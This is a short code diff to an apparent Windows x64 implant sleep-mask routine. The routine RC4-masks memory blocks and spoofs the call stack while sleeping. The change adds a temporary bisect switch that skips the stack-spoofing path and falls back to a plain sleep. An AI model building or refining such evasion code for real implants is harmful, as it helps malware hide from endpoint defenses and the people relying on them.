@@ -9,6 +9,8 @@
  * reason are the spoofed ones for the entire window. */
 #include "sleepmask_gen3.h"
 
+#define G3_BISECT_A  /* temporary: revert after the bisect round */
+
 #if defined(_M_X64)
 
 #include <windows.h>
@@ -414,6 +416,11 @@ BOOL gen3_sleep(DWORD time)
 	for (i = 0; i < nblocks; i++)
 		g3_rc4(blocks[i].ptr, blocks[i].len, key, (unsigned int)i);
 
+#if defined(G3_BISECT_A)
+	/* bisect round 1: RC4 masking only, plain sleep window */
+	Sleep(time);
+	if (0) {
+#endif
 	if (!g3_stack_spoof_sleep(time)) {
 		/* spoof machinery failed mid-window: unmask first, then serve a
 		 * plain sleep so the caller's contract still holds */
@@ -421,6 +428,9 @@ BOOL gen3_sleep(DWORD time)
 			g3_rc4(blocks[i].ptr, blocks[i].len, key, (unsigned int)i);
 		Sleep(time);
 	}
+#if defined(G3_BISECT_A)
+	}
+#endif
 
 	/* RC4 twice with the same key restores the plaintext */
 	for (i = 0; i < nblocks; i++)
